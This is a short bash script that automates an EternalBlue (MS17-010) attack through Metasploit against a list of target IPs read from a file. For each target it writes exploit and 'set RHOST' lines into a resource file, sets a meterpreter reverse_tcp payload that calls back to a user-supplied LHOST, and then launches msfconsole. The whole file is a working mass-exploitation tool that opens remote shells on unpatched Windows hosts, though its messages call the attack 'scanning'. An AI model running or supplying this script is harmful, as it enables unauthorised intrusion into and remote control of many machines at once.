#!/bin/bash

clear

file=./temp.txt
IFS=$'\n'
lhost=
echo 'This script making automatically scanning SMB port to exploit'
sleep 5
clear
file="$file"
  echo "File Included!"
  sleep 1
echo "Type yout LHOST"
read lhost
cat "$file" > ./TEMP.txt
echo "IP Imported!"
sleep 1
chmod 777 ./TEMP.txt
echo "chmod 777!"
sleep 1
echo "run" > ./q.txt
echo "run command added!"
sleep 1
touch ./run.rc
echo "Creating .rc file to metasploit"
sleep 2
echo "use exploit/windows/smb/ms17_010_eternalblue" >> ./run.rc
echo "Added scanner"
sleep 1
echo "set payload windows/x64/meterpreter/reverse_tcp" >> ./run.rc
sleep 1.5
echo "Payload added!"
sleep 1
echo set LHOST $lhost >> ./run.rc
for var in $(cat $file)
do
echo set RHOST "$var" >> ./run.rc
echo exploit >> ./run.rc
done
echo exit >> ./run.rc
echo "Removing temp files"
rm ./TEMP.txt
echo " /root/TEMP.txt"
echo "IP added to scan! & ready to Scanning!"
sleep 2
echo
clear
echo "***************************"
echo "*                         *"
echo "*       Start MSF         *"
echo "*                         *"
echo "***************************"
service postgresql start && msfdb start
echo "DB started!"
msfconsole -r ./run.rc
exit 0
